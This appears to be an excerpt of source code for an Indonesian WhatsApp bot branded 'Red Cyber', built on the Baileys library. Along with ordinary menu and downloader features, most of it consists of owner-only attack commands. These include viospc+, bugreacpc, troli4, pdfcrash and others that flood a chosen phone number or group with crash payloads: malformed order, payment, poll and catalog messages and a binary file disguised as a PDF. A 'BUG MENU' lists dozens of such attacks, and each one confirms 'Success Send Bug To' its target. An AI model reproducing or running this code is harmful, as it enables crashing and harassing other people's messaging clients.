...
const didinyt = ('*𝐍𝐨𝐭𝐞 !! :\n𝐁𝐨𝐭 𝐦𝐚𝐬𝐢𝐡 𝐝𝐚𝐥𝐚𝐦 𝐩𝐞𝐧𝐠𝐞𝐦𝐛𝐚𝐧𝐠𝐚𝐧,\n𝐉𝐢𝐤𝐚 𝐚𝐝𝐚 𝐛𝐮𝐠 𝐥𝐚𝐩𝐨𝐫 𝐤𝐞 𝐨𝐰𝐧𝐞𝐫*')  //ubah di config biar ngk emror
...
*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
            ...
            break
            case 'groupbot': {
                m.reply('Halo Kak\nGroup 𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿: https://chat.whatsapp.com/CigmOAZApWZDWnAKAHQ5Ju\nNOTE : Kalo kakak nya Punya Bot Masukin aja\n\n*_Makasih><_*')
            }
            break
            case 'tqto': {
                m.reply('THANK TO :\n\n█▀▀ █▄█ █▄▄ █▀▀ █▀█\n█▄▄ ░█░ █▄█ ██▄ █▀▄\n\n         █▄▄ █▀█ ▀█▀\n         █▄█ █▄█ ░█░\n\nOwner : 𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿\nNo.Owner : wa.me//:6282161959321\n')
            }
            break
            case 'chat': {
...
didin.sendMessage(m.chat, { caption: 'Tu Video Nya | Jangan Lupa Follow @𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿', video: { url: data.watermark }, buttons: button, footer: `© 𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿‡`, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
...
case 'votpol': {
if (!isCreator) return sticOwner(from)
let jansencoli = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${prefix}`,jpegThumbnail: thumb}}}
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO SAYA BOT NVS",
"options": [
...
didin.relayMessage(m.chat, order.message, { messageId: order.key.id })
}}
break
case 'docu': {
if (!isCreator) return sticOwner(from)
...
didin.relayMessage(m.chat, document.message, { messageId: document.key.id })
}}
break
case 'doc': {
if (!isCreator) return sticOwner(from)
...
ydd = `Hallo Aku Cyber`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/pict.jpg') }, { upload: didin.waUploadToServer })
...
didin.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}}
break
case 'paym': {
if (!isCreator) return sticOwner(from)
...
didin.relayMessage(m.chat, TESTKENJI.message, { messageId: TESTKENJI.key.id })
}
break
case 'ngetrol': {
if (!isCreator) return sticOwner(from)
...
if (isBan) throw sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: '𝐌𝐲 𝐂𝐡𝐞𝐧𝐞𝐥', url: m}}
]
const templateMessage = {
video:fs.readFileSync("./basetzy/gambarnye/kkk.mp4"),
gifPlayback:true,
...
didin.sendMessage(m.chat, templateMessage)
}
break
 case 'bugquick':{
if (!isCreator) return sticOwner(from)
...
await sleep(10000)
didin.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
...
for (let i = 0; i < jumlah; i++) {
 ...
 didin.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', }, {quoted:m})
 }}
 break
case 'pengsui': {
if (!isCreator) return sticOwner(from)
...
case 'viospc+' : {
if (!isCreator) return sticOwner(from)
if (args.length < 1) return m.reply(`Nomor Target`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await didin.sendMessage(m.chat, {react: { text: "👿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
didin.sendMessage(Pe, {text: `${pvz3}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${pvm3}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${funer}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${pv3m}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${lugia}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${explosion}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${parando}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${killed}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${cova}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${sumiu}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${destroi}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${voids}`}, {quoted:m})
await sleep(100)
didin.sendMessage(Pe, {text: `${explosionios}`}, {quoted:m})
await sleep(100)
}
break
case 'viospc' : {
...
case 'viosgc+' : {
if (!isCreator) return sticOwner(from)
if (args.length < 1) return m.reply(`Id Gc`)
...
if (!isCreator) return sticOwner(from)
if (/image/.test(mime)) {
anu = await didin.downloadAndSaveMediaMessage(quoted)
didin.sendMessage(m.chat, { image: {url: anu}, caption: `${vimg}` }, { quoted: m })
}}
break
case 'jadibugsw': {
if (!isCreator) return sticOwner(from)
if (/image/.test(mime)) {
anu = await didin.downloadAndSaveMediaMessage(quoted)
didin.sendMessage(m.chat, { image: {url: anu}, caption: `[⫹⫺ - 㑒 ${q} ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..${mt3}` }, { quoted: m })
}}
break
case 'vionce': {
if (!isCreator) return sticOwner(from)
didin.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/842cc1a7658a1c2b94c0c.jpg' },viewOnce : true, caption: `${vimg}` }, { quoted: m })
}
break
case 'vvonce': {
if (!isCreator) return sticOwner(from)
if (/video/.test(mime)) {
anu = await didin.downloadAndSaveMediaMessage(quoted)
didin.sendMessage(m.chat, {video: {url: anu},viewOnce : true, caption: `${vimg}` },{quoted: m })
}
}
break
case 'vvidsw':{
...
didin.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${vimg}` }, { quoted: m })
}
break
case 'troli4': {
if (!isCreator) return sticOwner(from)
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await didin.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${prefix}`,jpegThumbnail: undefined}}}
	var troli2 = generateWAMessage(m.reply,{
	"orderMessage": {
...
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
	...
	didin.relayMessage(m.reply, troli2.message, { messageId: troli2, a})
	}
	}
	break
	case 'peswe': {
if (!isCreator) return sticOwner(from)
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${prefix}`,jpegThumbnail: thumb}}}
	var image = generateWAMessage(m.reply,{
"imageMessage": {
...
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
	...
	didin.relayMessage(m.chat, image.message, { messageId:m})
}
break
case 'onsrah': {
if (isBan) throw sticBanLu(from)
...
didin.send5ButImg(m.chat, anu, didin.user.name, global.thumb, btn)
} else if (setbot.templateGif) {
didin.send5ButGif(m.chat, anu, didin.user.name, global.visoka, btn)
} else if (setbot.templateVideo) {
didin.send5ButVid(m.chat, anu, didin.user.name, global.visoka, btn)
} else if (setbot.templateMsg) {
didin.send5ButMsg(m.chat, anu, didin.user.name, btn)
}
}
break
case 'buglink':{
...
didin.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${qpeh}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth1}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'vweb':{
...
didin.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${konf}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'vgt':{
...
for (let i = 0; i < jumlah; i++) {
kontolu = '🔥፝⃟ ꙳𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ🔥፝⃟   ',
didin.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${konf}`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com${mnth1}`}}})
}
}
break
case 'vgs':{
...
for (let i = 0; i < jumlah; i++) {
kontolu = '🔥፝⃟ ꙳𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ🔥፝⃟   ',
didin.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ️`,body: `𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ${mnth}`,previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com${mnth1}`}}})
}
}
break
break
case 'jdfjjfjde': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw m.reply(m)
didin.sendMessage(m.chat,  { text : q ? q : '`\`\`\`「 ⚠️ Perhatian ⚠️ 」\`\`\`\n\nFitur Ini Telah Di Aktifkan!!`' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'jejrjfjeir' : {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw m.reply(m)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await didin.sendMessage(m.chat, {react: { text: "🥶️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
didin.sendMessage(Pe, {text: "Fitur Off!!"}, {quoted: a})
await sleep(10000)
}
break
case 'bugreacpc' : {
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await didin.sendMessage(m.chat, {react: { text: "👿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
didin.sendMessage(Pe, {text: "𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ"}, {quoted: m})
await sleep(10000)
didin.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: m})
await sleep(10000)
didin.sendMessage(Pe, {text: "𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ"}, {quoted: m})
await sleep(10000)
didin.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: m})
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await didin.sendMessage(m.chat, {react: { text: "👿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
didin.sendMessage(Pe, {text: `${notif4}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `${notif3}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `${notif4}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: m})
...
didin.sendMessage(Pe, {text: `${notif3}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `${notif4}`}, {quoted: a})
await sleep(1000)
didin.sendMessage(Pe, {text: `𝐓𝐡𝐞 𝐍𝐯𝐬 𝐈𝐧𝐅𝐢𝐧𝐢𝐭𝐲 🎭🔥 ${pen}`}, {quoted: m})
await sleep(1000)
didin.sendMessage(Pe, {text: `${notif3}`}, {quoted: m})
...
"totalCurrencyCode": "IDR"
 ...
 didin.sendMessage(num, {audio: hey, mimetype: 'audio/mpeg', }, {quoted: m})
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
...
for (let i = 0; i < jumlah; i++) {
          ...
          didin.sendContact(m.chat, global.ownerr, fkontaak)
         }
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
...
didin.sendContact(num, global.ownerr, fkontaak)
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
...
jumlah = q.split('|')[1] 
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/thezyren.jpg') }, { upload: didin.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
...
didin.relayMessage(num, order.message, { messageId: order.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
...
didin.relayMessage(num, template.message, { messageId: template.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
...
"mediaKeyTimestamp": "1632753911"
 ...
 didin.sendMessage(num, {video: hey, adehvn, }, {quoted: m})
 }
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
break
...
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
didin.sendMessage(num, { document: anuin, mimetype: 'application/pdf', fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.pdf`, title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.pdf` }, { quoted: m })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
        ...
        if (stderr.trim()) m.reply(stderr)
            ...
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                ...
                didin.sendListMsg(m.chat, `pilih aja *Do* Setmenu nya!`, didin.user.name, `*Hello Deardo* !`, `Pilih Do`, sections, m)
                }
            }
            break
            case 'sponsor': {
            if (!m.isGroup) throw mess.group
            let qontak = `6282161959321@s.whatsapp.net`
let dana = `6282161959321@s.whatsapp.net`
let shopeeotp = `6282161959321@s.whatsapp.net`
...
didin.sendMessage(m.chat, { react: { text: "🥶", key: m.key }})
  	anu = `𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗱𝗮𝘁𝗮𝗻𝗴 𝗱𝗶 𝗖𝘆𝗯𝗲𝗿𝗯𝗼𝘁. 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗽𝗶𝗹𝗶𝗵 "𝗠𝗲𝗻𝘂" 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗹𝗶𝗵𝗮𝘁 𝗺𝗲𝗻𝘂-𝗺𝗲𝗻𝘂 𝘆𝗮𝗻𝗴 𝗮𝗱𝗮 𝗱𝗶 𝗖𝘆𝗯𝗲𝗿𝗯𝗼𝘁.`
...
--------------------------------
𝟷. 𝙳𝚒𝚕𝚊𝚛𝚊𝚗𝚐 𝚜𝚙𝚊𝚖!
𝟸. 𝙳𝚒𝚕𝚊𝚛𝚊𝚗𝚐 𝚖𝚎𝚗𝚎𝚕𝚙𝚘𝚗 𝙱𝚘𝚝! 𝙹𝚒𝚔𝚊 𝚔𝚊𝚖𝚞 𝚖𝚎𝚗𝚎𝚕𝚙𝚘𝚗 𝚋𝚘𝚝 𝚖𝚊𝚔𝚊 𝚔𝚊𝚖𝚞 𝚊𝚔𝚊𝚗 𝚍𝚒 𝙱𝚕𝚘𝚌𝚔.
𝟹. 𝙳𝚒𝚕𝚊𝚛𝚊𝚗𝚐 𝚔𝚎𝚛𝚊𝚜 𝚔𝚎𝚗𝚝𝚞𝚝 𝚜𝚎𝚖𝚋𝚊𝚛𝚊𝚗𝚐𝚊𝚗.
--------------------------------
𝙽𝚘𝚝𝚎 ⚠️ :
𝙹𝚒𝚔𝚊 𝚊𝚍𝚊 𝙱𝚞𝚐 𝚋𝚒𝚜𝚊 𝚕𝚊𝚙𝚘𝚛 𝚔𝚎 𝚘𝚠𝚗𝚎𝚛 👇🏼
wa.me//:6282161959321`
...
case 'listmenu':{
  // send a list message!
   const sections = [
    {
    title: "亗 𝗠𝗲𝗻𝘂 𝗸𝗲𝗰𝗲𝗵 𝗕𝘆 𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿 🔥",
	rows: [
	   {
...
case 'tesrow':{
  // send a list message!
   const sections = [
    {
	title: "Selamat datang di 𝐂𝐲𝐛𝐞𝐫𝐛𝐨𝐭𝟵𝟵𝟵⸸⸸⸸",
	rows: [
	   {
	    title: "【🌺️】› 𝚂𝚒𝚖𝚙𝚕𝚎 𝙼𝚎𝚗𝚞 ‹", 
	    rowId: `${prefix}sjsk`,
	    description: '亗 𝗠𝗲𝗻𝘂 𝗸𝗲𝗰𝗲𝗵 𝗕𝘆 𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿 🔥',
	   },	    
     ]
    },
    {
  ...
  const listMessage = {
   text: `*_Hai kak ${pushname} ${ucapanWaktu}_*\n\nBerikut Pilihan Menunya!\n\n𝙺𝚎𝚝 :\n𝟷.) .𝚜𝚓𝚜𝚔 = 𝙼𝚎𝚗𝚞 𝚜𝚒𝚖𝚙𝚕𝚎\n𝟸.) .𝚕𝚒𝚜𝚝𝚖𝚎𝚗𝚞 = 𝙼𝚎𝚗𝚞 𝚔𝚎𝚌𝚎𝚑`,
   footer: "𝗥𝗲𝗱 𝗖𝘆𝗯𝗲𝗿‡",
   title: "",
   buttonText: "亗𝐂𝐲𝐛𝐞𝐫𝐛𝐨𝐭𝟵𝟵𝟵⸸⸸⸸",
   sections
   }
...
pimbon = `╔─═─⊱ *「 BUG MENU 」* ─═─⬣
│┏⊱
║⿻ あ ${prefix}> m.chat (CEK ID GRUP)
│⿻ あ ${prefix}Bugtag [ Bug @ ]
║⿻ あ ${prefix}Crash [ Bug Text ]
│⿻ あ ${prefix}Bugreacpc [ Nomor Target ]
║⿻ あ ${prefix}Vncrash [ Nomor Target ]
│⿻ あ ${prefix}Bugreacgc [Id Group]
║⿻ あ ${prefix}Bugsticker [ PC / GC ]
│⿻ あ ${prefix}Catalogc [ Crash Home ]
║⿻ あ ${prefix}Catalog+ [ Crash Home + IDR ]
│⿻ あ ${prefix}Catalog [ IDR ]
║⿻ あ ${prefix}Catalog2 [ PC  / GC ]
│⿻ あ ${prefix}Bugbutton [ Jumlah ]
║⿻ あ ${prefix}Virkon [ 86 CTT ]
│⿻ あ ${prefix}Fotoc [ Nomor Target ]
║⿻ あ ${prefix}Pdfcrash [ Pc / Gc ]
│⿻ あ ${prefix}Buglist [ New Md ]
║⿻ あ ${prefix}Virvid [ Pc / Gc ]
│⿻ あ ${prefix}Senbug [ Pilihan ]
║⿻ あ ${prefix}Bugvip [ Pilihan ]
│⿻ あ ${prefix}Jadibug1 [ Reply ]
║⿻ あ ${prefix}Jadibug2 [ Reply ]
│⿻ あ ${prefix}Jadibug3 [ Reply ]
║⿻ あ ${prefix}Jadibug4 [ Reply ]
│⿻ あ ${prefix}Jadibug5 [ Reply ]
║⿻ あ ${prefix}Permisi [ Bug List ]
│⿻ あ ${prefix}Bugstik [ Jumlah ]
║⿻ あ ${prefix}Bughen [ Nomor Target ]
│⿻ あ ${prefix}Virdoc [ Document ]
║⿻ あ ${prefix}Inibug [ Jenis Tagal ]
│⿻ あ ${prefix}Catalog3 [ Pc / Gc ]
║⿻ あ ${prefix}Troli [ Troli Cart ]
│⿻ あ ${prefix}Gascrash [ Pc ]
║⿻ あ ${prefix}Bug1 [ Bug Jenis Audio ]
│⿻ あ ${prefix}Bug2 [ Bug Jenis Foto ]
║⿻ あ ${prefix}Bug3 [ Bug Jenis Doc ]
│⿻ あ ${prefix}Bug4 [ Bug Jenis Grup ]
║⿻ あ ${prefix}Bug5 [ Bug Jenis Lokas ]
│⿻ あ ${prefix}Bug6 [ Bug Jenis Troli ]
║⿻ あ ${prefix}Bug7 [ Bug Jenis Ctt ]
│⿻ あ ${prefix}Listcrash [ Pc ]
║⿻ あ ${prefix}Cart [ Pc / Gc ]
│⿻ あ ${prefix}Cttcrash [ Pc ]
║⿻ あ ${prefix}Dokcrash [ Pc / Gc ]
│⿻ あ ${prefix}Audiocrash [ Pc / Gc ]
║⿻ あ ${prefix}Oncrash [ Vitur Grup ]
│⿻ あ ${prefix}Cttall [ Pc ]
║⿻ あ ${prefix}Virkonc [ Ctt ]
│⿻ あ ${prefix}Pdfspam [ Jumlah ]
║⿻ あ ${prefix}Bugpdf [ Pdf ]
│⿻ あ ${prefix}Spam [ Jumlah ]
║⿻ あ ${prefix}Bugpc [ Buginvite ]
│⿻ あ ${prefix}Bannum [ Report ]
║⿻ あ ${prefix}Unban [ Support ]
│⿻ あ ${prefix}Pccrash [ Pc ]
║⿻ あ ${prefix}Lokas [ Live Lokasi ]
│⿻ あ ${prefix}Livelok [ Pc / Gc ]
║⿻ あ ${prefix}Tzycrashpc [ Nomor Target ]
│⿻ あ ${prefix}Image [ Pc / Gc ]
║⿻ あ ${prefix}Tzycrashgc [ Id Gc ]
│⿻ あ ${prefix}Cttbusin [ Pc ]
║⿻ あ ${prefix}Poll [ Pol+Txt Kosong ]
│⿻ あ ${prefix}Votpol [ Vote Crash ]
║⿻ あ ${prefix}Polvote [ Teks ]
│⿻ あ ${prefix}Troli2 [ CartV2 ]
║⿻ あ ${prefix}Paym [ Virtex Pay ]
│⿻ あ ${prefix}Paymv [ V Pay Thum Img ]
║⿻ あ ${prefix}Stpc [ Pc ]
│⿻ あ ${prefix}Stgc [ Gc ]
║⿻ あ ${prefix}Doc [ Virdoc New V1 ]
│⿻ あ ${prefix}Docu [ Virdoc New V2 ]
║⿻ あ ${prefix}Virduc [ Virdoc New V3 ]
│⿻ あ ${prefix}Duc [ Virdoc New V4 ]
║⿻ あ ${prefix}Spamv [ Jumlah ]
│⿻ あ ${prefix}Afk [ Reaction Emoji ]
║⿻ あ ${prefix}Vaudio [ Virus Media ]
│⿻ あ ${prefix}Pengsui [ Text Kosong ]
║⿻ あ ${prefix}Vimgsw [ Reply Foto ]
│⿻ あ ${prefix}Vionce [ Virus Once Img ]
║⿻ あ ${prefix}Vvonce [ Reply Video ]
│⿻ あ ${prefix}Vvidsw [ Virvid Sw ]
║⿻ あ ${prefix}Troli4 [ Cart Crash ]
│⿻ あ ${prefix}Vtag [ Tag Di Gc ]
║⿻ あ ${prefix}Bugvid [ View Vid Crash ]
│⿻ あ ${prefix}Vbuy [ V Click Bayar ]
║⿻ あ ${prefix}Buglink [ Virus Link ]
│⿻ あ ${prefix}Vweb [ Virus Website ]
║⿻ あ ${prefix}Jadicatalogc [ Reply Img+Txt ]
│⿻ あ ${prefix}Jadicatalog+ [ Reply Img+Txt ]
║⿻ あ ${prefix}Vgt [ V Web ]
│⿻ あ ${prefix}Vgs [ V Web ]
║⿻ あ ${prefix}Jadicatalog [ Reply Foto ]
│⿻ あ ${prefix}Jadibugsw [ Reply Img+Txt ]
║⿻ あ ${prefix}🔥 [ Bug Bew ]
│⿻ あ ${prefix}Bugytta [ Button 6 ]
║⿻ あ ${prefix}Buttonimg [ Img Bug Button ]
│⿻ あ ${prefix}Bugquick [ Button 9 ]
║⿻ あ ${prefix}⚠️ [ Dangerr ]
│⿻ あ ${prefix}Ftroli [ Cart ]
║⿻ あ ${prefix}> Aud
│⿻ あ ${prefix}> Aud1
║⿻ あ ${prefix}> Buttontzy
│⿻ あ ${prefix}> Buttonvirus
║⿻ あ ${prefix}> Cttl
│⿻ あ ${prefix}> Ker
║⿻ あ ${prefix}> Mata
│⿻ あ ${prefix}> Mata1
...
║⿻ あ ${prefix}> Destroi
│⿻ あ ${prefix}> Voids
║⿻ あ ${prefix}> Explosionios
│⿻ あ ${prefix}> Vimg
║⿻ あ ${prefix}> Vimgesw
│⿻ あ ${prefix}> Konf
║⿻ あ ${prefix}> Vnolim
│⿻ あ ${prefix}Viospc+ [ Private Chat ]
║⿻ あ ${prefix}Viospc [ Private Chat ]
│⿻ あ ${prefix}Vandropc [ Private Chat ]
║⿻ あ ${prefix}Viosgc+ [ Group Chat ]
│⿻ あ ${prefix}Viosgc [ Group Chat ]
║⿻ あ ${prefix}Vandrogc [ Group Chat ]
│┗⊱
┗━━━━━━━━━━━━━━━━━━⬣
...
break
            case 'p': {
didin.sendMessage(m.chat, { react: { text: "✅", key: m.key }})
p = `𝗦𝗮𝘆𝗮 𝗯𝗼𝘁 𝘄𝗮 𝗺𝗶𝗹𝗶𝗸 𝗗𝗲𝗮𝗿𝗱𝗼. 𝗣𝗶𝗹𝗶𝗵 𝗺𝗲𝗻𝘂 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗹𝗶𝗵𝗮𝘁 𝗳𝗶𝘁𝘂𝗿 𝗯𝗼𝘁.`
let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'MENU‡'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI‡'}, type: 1}]
let buttonMessage = {
  document: fs.readFileSync('./DidinMedia/doc/fake.pdf'),
  fileName : `Hi ${pushname} |${ucapanWaktu}`,
...
vice = `𝗠𝘂𝗹𝘂𝘁 𝗔𝗻𝗱𝗮 𝗸𝗼𝘁𝗼𝗿 🗿`
let buttons = [{ buttonId: `.`, buttonText: {displayText: 'TOXIC👿'}, type: 1},{buttonId: `.`, buttonText: {displayText: 'TOBAT⛪'}, type: 1}]
let buttonMessage = {
  document: fs.readFileSync('./DidinMedia/doc/fake.pdf'),
  fileName : `❎ OFFSIDE ‼️`,
  caption: vice,
